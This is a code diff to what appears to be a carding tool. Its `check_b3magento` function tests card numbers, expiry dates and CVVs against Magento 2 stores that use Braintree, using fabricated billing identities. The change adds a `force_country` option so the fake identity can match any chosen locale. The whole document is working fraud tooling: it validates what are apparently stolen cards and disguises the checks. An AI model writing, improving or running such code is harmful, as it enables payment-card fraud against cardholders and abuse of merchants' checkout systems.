@@ -508,8 +508,11 @@ def _get_client_token(session: requests.Session, domain: str, ua: str) -> str:
 
 # -- Main checker ------------------------------------------------------------
 
-def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, **kwargs) -> dict:
-    """Check one card against a Magento 2 + Braintree store."""
+def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, force_country: str = "", **kwargs) -> dict:
+    """Check one card against a Magento 2 + Braintree store.
+
+    force_country: override locale detection (e.g. 'US' or 'GB').
+    """
 
     cc, mm, yy, cvv = card_tuple
     yy       = convert_year(yy)
@@ -613,8 +616,8 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
         return {"status": "unknown", "message": f"clientToken decode: {exc}", "amount": "", "card": card_str}
 
     # 5. Build billing identity (locale-aware)
-    ident      = get_billing_identity(domain)
-    country    = ident.get("country") or get_country_for_domain(domain) or "US"
+    ident   = get_billing_identity(force_country or domain)
+    country = force_country or ident.get("country") or get_country_for_domain(domain) or "US"
     state      = ident.get("state", "")
     state_full = ident.get("state_full", state)
     full_name  = f"{ident['fname']} {ident['lname']}"
